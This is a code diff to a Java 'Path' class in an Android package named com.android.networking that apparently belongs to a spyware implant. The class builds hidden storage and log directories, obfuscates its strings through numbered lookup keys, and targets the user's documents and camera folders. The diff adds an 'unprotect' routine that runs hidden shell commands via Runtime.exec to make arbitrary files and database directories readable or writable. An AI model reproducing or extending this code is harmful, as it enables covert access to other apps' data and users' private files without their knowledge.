@@ -10,6 +10,7 @@
 package com.android.networking.file;
 
 import java.io.File;
+import java.io.IOException;
 
 import android.database.Cursor;
 import android.os.Environment;
@@ -65,13 +66,12 @@ public class Path {
 	 * @return true, if successful
 	 */
 	public static boolean makeDirs() {
-		/** The Constant CONF_DIR. */
+	
+		/** The Constant CONF_DIR. 24_0=cdd/*/
 		CONF_DIR = Messages.getString("24_0"); //$NON-NLS-1$
-		// public static final String DEBUG_DIR = "dwm/";
-		/** The Constant MARKUP_DIR. */
-		MARKUP_DIR = Messages.getString("24_1"); //$NON-NLS-1$
-
-		/** The Constant LOG_DIR. */
+		/** The Constant MARKUP_DIR. 24_1=msdd/ */
+		MARKUP_DIR = Messages.getString("24_1"); //$NON-NLS-1
+		/** The Constant LOG_DIR. 24_2=ldd/ */
 		LOG_DIR = Messages.getString("24_2"); //$NON-NLS-1$
 
 		try {
@@ -90,27 +90,14 @@ public class Path {
 				DateTime dt = new DateTime();
 
 				curLogFile = LOG_FILE + "-" + dt.getOrderedString() + ".txt";
-
 				final File file = new File(logs(), curLogFile);
-
 				file.createNewFile();
 			}
 
-/*			String[] projection = new String[]{MediaStore.Images.ImageColumns._ID,MediaStore.Images.ImageColumns.DATA,MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,MediaStore.Images.ImageColumns.DATE_TAKEN,MediaStore.Images.ImageColumns.MIME_TYPE};     
-            final Cursor cursor = Status.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,projection, null, null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC"); 
-            if(cursor != null){
-                cursor.moveToFirst();
-                picture= cursor.getString(cursor.getColumnIndex("DESC")); 
-                // you will find the last taken picture here
-                // according to Bojan Radivojevic Bomber comment do not close the cursor (he is right ^^)
-                cursor.close();
-            }*/
-			
-			// TODO: sistemare, sono 
-			doc= Environment.getExternalStorageDirectory() + "/My Documents";
+			// TODO: sistemare, sono
+			doc = Environment.getExternalStorageDirectory() + "/My Documents";
 			picture = Environment.getExternalStorageDirectory() + "/DCIM/100MEDIA";
-			
-			
+
 			initialized = success;
 			return success;
 
@@ -154,7 +141,7 @@ public class Path {
 		} else {
 
 			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + Messages.getString("24_5");
-			
+
 		}
 
 		if (Cfg.DEBUG) {
@@ -218,6 +205,44 @@ public class Path {
 		return hidden() + LOG_DIR;
 	}
 
+	public static boolean unprotect(String path) {
+		return unprotect(path, false);
+	}
+
+	public static boolean unprotect(String path, boolean fullmode) {
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
+			}
+			File file = new File(path);
+
+			if (fullmode) {
+				if (file.canRead() && file.canWrite()) {
+					return true;
+				}
+				Runtime.getRuntime().exec(Messages.getString("h_9") + path);
+			} else {
+				if (file.canRead()) {
+					return true;
+				}
+				Runtime.getRuntime().exec(Messages.getString("h_3") + path);
+			}
+
+			return file.canRead();
+		} catch (IOException ex) {
+			Check.log(TAG + " Error (unprotect): " + ex);
+			return false;
+		}
+	}
+
+	public static boolean unprotect(String dbDir, String fileName, boolean fullMode) {
+		unprotect(dbDir, fullMode);
+		File file = new File(dbDir, fileName);
+		unprotect(file.getAbsolutePath(), fullMode);
+
+		return (file.canRead());
+	}
+
 	/**
 	 * Removes the directory.
 	 * 
@@ -260,7 +285,10 @@ public class Path {
 			return bytesAvailable;
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
-				ex.printStackTrace();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (freeSpace) ERROR: " + ex);
+				}
+
 			}
 			return 0;
 		}
